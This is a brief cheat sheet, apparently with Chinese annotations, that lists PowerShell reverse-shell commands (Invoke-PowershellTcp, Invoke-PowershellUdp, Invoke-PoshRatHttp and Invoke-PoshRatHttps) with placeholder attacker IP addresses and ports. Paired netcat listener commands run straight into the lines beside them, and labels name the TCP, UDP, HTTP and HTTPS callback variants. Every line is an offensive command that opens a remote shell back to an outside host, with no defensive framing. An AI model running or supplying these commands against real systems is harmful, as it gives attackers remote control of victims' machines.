```
Invoke-PowershellTcp -Reverse -IPAddress x.x.x.x -Port xxxxnc -lvvp xxxx反弹tcp协议
Invoke-Powershelludp -Reverse -IPAddress x.x.x.x -port xxxxnc -lup xxxx反弹udp协议
Invoke-PoshRatHttp -IPAddress x.x.x.x -Port xxxx反弹http协议
Invoke-PoshRatHttps -IPAddress x.x.x.x -Port xxxx反弹https协议
```
